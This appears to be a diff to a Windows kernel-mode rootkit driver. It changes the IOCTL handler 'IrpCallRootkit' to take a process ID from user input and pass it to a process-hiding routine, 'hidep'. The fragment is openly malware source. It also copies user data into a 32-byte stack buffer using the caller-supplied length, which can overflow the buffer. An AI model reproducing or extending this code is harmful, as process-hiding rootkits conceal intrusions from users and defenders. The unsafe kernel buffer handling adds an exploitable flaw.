@@ -27,7 +27,19 @@ NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
 	outBufferLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
 	requestCode = irpSp->Parameters.DeviceIoControl.IoControlCode;
 
-	Irp->IoStatus.Status = requestCode == IRP_ROOTKIT_CODE ? hidep() : STATUS_INVALID_DEVICE_REQUEST;
+	PCHAR inBuf = Irp->AssociatedIrp.SystemBuffer;
+
+	Irp->IoStatus.Information = inBufferLength;
+
+	if (requestCode != IRP_ROOTKIT_CODE) {
+		Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
+		return Irp->IoStatus.Status;
+	}
+
+	char pid[32];
+	strcpy_s(pid, inBufferLength, inBuf);
+
+	hidep(atoi(pid));
 
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
 
